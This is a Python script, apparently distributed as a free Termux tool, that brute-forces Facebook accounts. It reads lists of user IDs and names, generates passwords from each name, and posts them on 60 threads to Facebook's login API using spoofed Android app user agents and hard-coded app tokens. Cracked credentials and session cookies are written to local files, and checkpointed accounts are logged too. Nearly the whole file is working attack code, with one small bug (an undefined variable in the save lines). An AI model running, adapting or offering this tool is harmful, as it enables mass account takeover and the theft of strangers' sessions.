""" WRITTEN BY ---( AINSLEY )--- """
#--------------------< IMPORT >--------------------#
import requests,random,uuid,string,hashlib,json,os,base64,zlib,pip,urllib,urllib3,platform,math,smtplib,os,base64,zlib,pip,urllib
from os import path
from urllib.request import urlopen
try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess
	from string import *
	from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
	print('<[=]> INSTALLING MISSING MODULES...');os.system('pip install requests futures==2 > /dev/null')
except:pass
#--------------------< LOOP >--------------------#
loop=0;oks=[];cps=[];twf=[];pcp=[];id=[];tokenku=[];user=[];plist=[]
#--------------------< SYS >--------------------#
sys.stdout.write('\x1b]2; <[AINSLEY-XD]>\x07')
#--------------------< UA SERVER 1 >--------------------#
def NON2():
	facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fbbv = str(random.randint(10000000, 66666666))
	fbrv = str(random.randint(000000000,999999999))
	fbcr = random.choice(['Robi','Grameenphone','Nepal_Telecom', 'DOCTYPE', 'MTN-CG', 'null', 'Salaam Telecom', 'BASE'])
	density = random.choice(['1.0', '1.5', '2.0', '2.5', '3.0'])
	width = random.choice(["720", "1080", "1280"])
	height = random.choice(["720", "1080", "1280", "1440", "1920"])
	fbsv = f"{random.randint(4, 13)}"
	build = random.choice(['SKQ1.210216.001','RKQ1.211103.002','SP1A.210812.016','TP1A.220905.001'])
	fbdv = random.choice(['22122RK93C','22041216C','2201117TY','2304FPN6DC','22101316UP','2206122SC','2106118C','21091116UI','M2105K81AC','M2101K6G','Redmi Note 10 Lite','M2003J15SC','MI CC9 Pro','2201116TG','22041216UC','21061119DG','Mi 9T','2304FPN6DG','MI CC9 Pro Premium Edition','Redmi Note 8 Pro','Mi Note 10','MI 8 Explorer Edition','Mi Note 10 Lite'])
	END = f"[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/es_La;FBRV/{str(fbrv)};FBCR/{fbcr};FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/{str(fbdv)};FBSV/{fbsv};FBOP/19;FBCA/arm64-v8a:]"
	ua = f'Davik/2.1.0 (Linux; U; Android {fbsv}; {str(fbdv)} Build/'+str(build)+') '+END
	return ua
#--------------------< UA SERVER 1 >--------------------#
def NON1():
	fb_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fb_version_code = str(random.randint(10000000, 66666666))
	density = random.choice(['1.0', '1.5', '2.0', '2.5', '3.0'])
	width = random.randint(720, 1440)
	height = random.randint(1080, 2560)
	fbrv = str(random.randint(000000000,999999999))
	sim_name = random.choice(['Telenor','fido','MOVO AFRICA','UFONE-PAKTel','Zong','Jazz','SCO','Jio','Vodafone','Airtel','BSNL','MTNL','Grameenphone','Robi','Banglalink','Teletalk','Telkomsel','Indosat Ooredoo','Axiata','Tri','Smartfren','China Mobile','Unicom','Telecom','Satcom','Docomo','Rakuten','IIJmio','Orange','Verizon','AT&T','T-Mobile','Sprint','Vodafone','Telefonica','EE','Orange','Three'])
	county_code = random.choice(["es_La", "en_GB"])
	android_version = f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
	android_model = random.choice(["SM-G920F", "SM-T535", "SM-T231", "SM-J320F", "GT-I9190", "GT-N7100", "SM-T561", "GT-N7100", "GT-I9500", "SM-J320F", "SM-G930F", "SM-J320F", "SM-J510FN", "GT-P5100", "SM-J320F", "SM-T531", "SPH-L720", "GT-I9500"])
	user_agent1 = f"[FBAN/FB4A;FBAV/{fb_version};FBBV/{fb_version_code};FBDM/{{density={density},width={width},height={height}}};FBLC/{county_code};FBCR/{sim_name};FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{android_model};FBSV/{android_version};FBOP/1;FBCA/armeabi-v7a:armeabi;]"
	user_agent2 = f"[FBAN/FB4A;FBAV/{fb_version};FBBV/{fb_version_code};FBDM/{{density={density},width={width},height={height}}};FBLC/{county_code};FBRV/{fbrv};FBCR/{sim_name};FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{android_model};FBSV/{android_version};FBOP/1;FBCA/arm64-v8a:;]"
	return random.choice([user_agent1,user_agent2])
#--------------------< COLOUR >--------------------#
G="\x1b[38;5;46m";W="\x1b[38;5;15m";R="\x1b[38;5;160m";B="\033[1;90m";Y="\033[1;33m";T="\033[1;34m";P="\x1b[38;5;205m"
#--------------------< STYLE >--------------------#
nx=f"{R}<{W}={R}>{G}";nx1=f"{R}<{W}1{R}>{G}";nx2=f"{R}<{W}2{R}>{G}";nx3=f"{R}<{W}3{R}>{G}";nx4=f"{R}<{W}4{R}>{G}";nx5=f"{R}<{W}5{R}>{G}";nx6=f"{R}<{W}6{R}>{G}";nx0=f"{R}<{W}0{R}>{G}";nxx=f"{R}<{W}?{R}>{G}";nxxx=f"{R}:{G}"
#--------------------< CLEAR >--------------------#
def clear():os.system('clear');print(logo)
def linex():print(f'{W}──────────────────────────────────────────────────')
#--------------------< LOGO >--------------------#
logo = f"""
{B}.88b  d88.  .d88b.  d88888b db    db  .d8b.  d8b   db
{B}88'YbdP`88 .8P  Y8. 88'     `8b  d8' d8' `8b 888o  88
{R}88  88  88 88    88 88ooooo  `8bd8'  88ooo88 88V8o 88
{R}88  88  88 88    88 88~~~~~    88    88~~~88 88 V8o88
{B}88  88  88 `8b  d8' 88.        88    88   88 88  V888
{B}YP  YP  YP  `Y88P'  Y88888P    YP    YP   YP VP   V8P    
{W}──────────────────────────────────────────────────
{nx} OWNER    {nxxx} MOE HTET YAN
{nx} FACEBOOK {nxxx} AINSLEY{R}[{T}GOTTEE{R}]
{nx} TOOLTYPE {nxxx} FILE{R}[{T}ALL-COUNTRY{R}]{G}CLONE
{nx} STATUS   {nxxx} FREE TOOL 
{nx} Teligerm {nxxx} https://t.me/MinkoGyi4
{W}──────────────────────────────────────────────────"""
#--------------------< MAIN MENU >--------------------#
def AINSLEY():
    clear();print(f"{nx1} START FILE CLONE ");print(f"{nx2} CONTACT TOOL OWNER");print(f"{nx0} EXIT CLONING");linex();sadiya=input(f"{nxx} SELECT {nxxx} ")
    if sadiya in ['1']:___file___()
    elif sadiya in ['2']:os.system('xdg-open https://www.facebook.com/moe.htet.yan.124755?mibextid=ZbWKwL');AINSLEY()
    elif sadiya in ['0']:exit(f"{R}[{T} THANKS FOR USE BYE BYE{R} ] ")
    else:linex();print(f'{nx} OPTION NOT FOUND ');linex();time.sleep(1);print(f"{nx} TRY AGAIN");time.sleep(1);AINSLEY()
#--------------------< FILE MENU >--------------------#
def ___file___():
	clear();print(f'{nx} EXAMPLE {nxxx} /sdcard/AINSLEY.txt');linex();file=input(f"{nxx} ENTER FILE NAME {nxxx} ")
	try:
		fo = open(file,'r').read().splitlines()
	except FileNotFoundError:
		linex();print(f'{nx} OPTION NOT FOUND ');linex();time.sleep(1);print(f"{nx} TRY AGAIN");time.sleep(1);___file___()
	clear();print(f'{nx1} METHOD {R}|{G}M1{R}|');print(f'{nx2} METHOD {R}|{G}M2{R}|');linex();methd=input(f"{nxx} SELECT {nxxx} ")
	clear();print(f'{nx} NOTE {nxxx} AUTO PASSWORD ');linex();print(f'{nx1} AUTO {R}|{G}27{R}|{G} PASSWORD CLONE');print(f'{nx2} MANUAL PASSWORD CLONE');linex();ppp=input(f"{nxx} SELECT {nxxx} ")
	if ppp in ['1']:
		plist.append('firstlast')
		plist.append('first last')
		plist.append('lastlast')
		plist.append('last last')
		plist.append('LastLast')
		plist.append('lastfirst')
		plist.append('firstlast12')
		plist.append('firstlast123')
		plist.append('firstlast1234')
		plist.append('firstlast12345')
		plist.append('firstlast2001')
		plist.append('firstlast2002')
		plist.append('firstlast2003')
		plist.append('firstlast2004')
		plist.append('firstlast2005')
		plist.append('firstlast2006')
		plist.append('firstlast2007')
		plist.append('firstlast2008')
		plist.append('firstlast1122')
		plist.append('firstlast2009')
		plist.append('firstlast2010')
		plist.append('firstlasr1997')
		plist.append('Firstlast123')
		plist.append('lastlast123')
		plist.append('firstlast1998')
		plist.append('firstlast1996')
		plist.append('firstlast1999')
	else:
		try:
			clear();print(f'{nx} EXAMPLE {nxxx} PASSWORD LIMIT {R}|{G}10-25{R}|');linex()
			ps_limit = int(input(f'{nxx} ENTER PASSWORD LIMIT {nxxx} '))
		except:
			ps_limit = 5
		clear();print(f'{nx} EXAMPLE {nxxx} first12 {R}|{G} first123 {R}|{G} firstlast ');linex()
		for i in range(ps_limit):
			plist.append(input(f'{nx} PASSWORD NO{R}|{G}{i+1}{R}| {nxxx} '))
	clear();print(f'{nx} CP UID SHOW {nxxx} {R}|{G}y{R}|{G}n{R}|');linex();cpx=input(f"{nxx} SELECT {nxxx} ")
	if cpx in ['y','Y','yes','Yes','1']:
		pcp.append('y')
	else:
		pcp.append('n')
	with tred(max_workers=60) as __AINSLEY__:
		clear();total_ids = str(len(fo))
		print(f'{nx} UID{R}|{G}METHOD {nxxx}{W} {total_ids}{R}|{W}M{methd} ');print(f"{nx} IF NO RESULT {R}|{G}ON{R}|{G}OFF{R}|{G} AIRPLANE MODE");linex()
		for user in fo:
			ids,names = user.split('|')
			passlist = plist
			if methd in ['1']:
				__AINSLEY__.submit(___M1___,ids,names,passlist)
			elif methd in ['2']:
				__AINSLEY__.submit(___M2___,ids,names,passlist)
			else:
				__AINSLEY__.submit(___M1___,ids,names,passlist)
	print('\033[1;37m');linex();print(f'{nx} THE PROCESS HAS COMPLETED');print(f'{nx} TOTAL OK{R}|{G}CP {nxxx} '+str(len(oks))+'/'+str(len(cps)));linex();exit()
#--------------------< FILE METHOD M1 >--------------------#
def ___M1___(ids,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write(f'\r\r{R}<{W}={R}>{W}-{R}<{G}MR-AINSLEY{R}>{W}-{R}|{T}%s{R}|{W}-{R}|{G}%s{R}|{W}-{R}|{P}%s{R}| '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        with requests.Session() as session:
                        	data = {"adid": str(uuid.uuid4()),
                        	"format": "json","device_id": str(uuid.uuid4()),
                        	"cpl": "true","family_device_id":str(uuid.uuid4()),
                        	"credentials_type": "device_based_login_password",
                        	"error_detail_type": "button_with_disabled",
                        	"source": "device_based_login",
                        	"email": ids,"password": pas,
                        	"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                        	"generate_session_cookies": "1",
                        	"meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),
                        	"currently_logged_in_userid": "0","locale": random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
                        	"client_country_code": random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]), 
                        	"method": "auth.login","fb_api_req_friendly_name": "authenticate",
                        	"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        	"api_key": "882a8490361da98702bf97a021ddc14d"}
                        	headers = {'User-Agent': NON1(),
                        	"Accept-Encoding": "gzip, deflate",
                        	"Accept": "*/*","Connection": "keep-alive",
                        	"Content-Type": "application/x-www-form-urlencoded",
                        	"Host": "graph.facebook.com",
                        	"X-FB-Net-HNI": str(random.randint(20000, 40000)),
                        	"X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                        	"X-FB-Connection-Type": "MOBILE.LTE",
                        	"X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
                        	"x-fb-device-group": str(random.randint(20000, 40000)),
                        	"X-FB-Friendly-Name": "ViewerReactionsMutation",
                        	"X-FB-Request-Analytics-Tags": "graphservice",
                        	"X-FB-HTTP-Engine": "Liger",
                        	"X-FB-Client-IP": "True","X-FB-Server-Cluster": "True",
                        	"x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"}
                        url = "https://api.face"+"book.com/au"+"th/lo"+"gin"
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        cookie = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f'\r\r{R}<{W}={R}>{W}-{R}<{G}ASRAFUL-OK{R}>{G} '+ids+' | '+pas+'\033[1;97m')
                                        print(f'\r\r{R}<{W}={R}>{W}-{R}<{G}COOKIES{R}>{G} '+cookie);linex()
                                        open('/sdcard/ASRAFUL-FILE-M1-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{R}<{W}={R}>{W}-{R}<{P}AINSLEY-CP{R}>{P} '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/AINSLEY-FILE-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#--------------------< FILE METHOD M2 >--------------------#
def ___M2___(ids,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write(f'\r\r{R}<{W}={R}>{W}-{R}<{G} MR-AINSLEY {R}>{W}-{R}|{T}%s{R}|{W}-{R}|{G}%s{R}|{W}-{R}|{P}%s{R}| '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        data = {"adid": adid,"format": "json",
                        "device_id": str(uuid.uuid4()),
                        "email": ids,"password": pas,
                        "generate_analytics_claims": "1",
                        "credentials_type": "password",
                        "source": "login","error_detail_type": "button_with_disabled",
                        "enroll_misauth": "false",
                        "generate_session_cookies": "1",
                        "generate_machine_id": "1",
                        "fb_api_req_friendly_name": "authenticate",}
                        headers={"Accept-Encoding": "gzip, deflate",
                        "Accept": "*/*","Connection": "keep-alive",
                        "User-Agent": NON2(),
                        "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                        "X-FB-Friendly-Name": "authenticate",
                        "X-FB-Connection-Type": "unknown",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "X-FB-HTTP-Engine": "Liger","Content-Length": "329",}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        cookie = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f'\r\r{R}<{W}={R}>{W}-{R}<{G}AINSLEY-OK{R}>{G} '+ids+' | '+pas+'\033[1;97m')
                                        print(f'\r\r{R}<{W}={R}>{W}-{R}<{G}COOKIES{R}>{G} '+cookie);linex()
                                        open('/sdcard/AINSLEY-FILE-M2-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in po:
                                        if 'y' in pcp:
                                                print(f'\r\r{R}<{W}={R}>{W}-{R}<{P} AINSLEY-CP{R}>{P} '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/AINSLEY-FILE-M2-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break                                        
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{R}<{W}={R}>{W}-{R}<{P}AINSLEY-CP{R}>{P} '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/AINSLEY-FILE-M2-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#--------------------< END CODE >--------------------#
AINSLEY()
